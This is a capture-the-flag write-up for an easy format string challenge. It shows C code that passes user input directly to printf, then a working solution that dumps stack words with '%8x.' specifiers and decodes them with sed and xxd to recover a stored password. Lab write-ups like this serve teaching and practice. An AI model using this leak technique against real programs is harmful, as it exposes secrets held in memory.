## ELF32 - Format string bug basic 1

| Author | Level | Points |
| ------ | ----- | ------ |
| Lu33Y | Easy | 15 |

> ... or how to read through the stack
>
><b> Statement </b> <br />
>Environment configuration : 
> * [ ] Postion Independent Executable 
> * [ ] Read Only relocations
> * [ ] Non-Executable Stack 
> * [ ] Non-Executable Heap 
> * [ ] Address Space Layout Randomisation 
> * [ ] Source Fortification 
> * [x] Source code access
>
>Source code :
>
>```c
>#include <stdio.h>
>#include <unistd.h>
> 
>int main(int argc, char *argv[]){
>	FILE *secret = fopen("/challenge/app-systeme/ch5/.passwd", "rt");
>	char buffer[32];
>	fgets(buffer, sizeof(buffer), secret);
>	printf(argv[1]);
>	fclose(secret);
>	return 0;
>}
>```

#### Solution

First, discover the content of `.passwd` file

```
$ ls -l .passwd
-r--r---- 1 app-systeme-ch5-cracked app-systeme-ch5-cracked 14 Feb 8 2012 .passwd
```
The file size is 14 bytes, we get

 * Read the first 14 address inside of stack
```
./ch5 $(python -c 'print "%8x."*14')
```

 * Sort the hex digit after print out the value of stack
```
sed -r 's/(..)(..)(..)(..)/\4\3\2\1\s/g'
```

 * Hex -> Ascii string
```
xxd -r -p
```

Then get the password with:
```
echo -e $(./ch5 $(python -c 'print "%8x."*14') | sed -r 's/(..)(..)(..)(..)/\4\3\2\1\s/g') | xxd -r -p | grep -Eaz "[[:print:]]{13}"
```
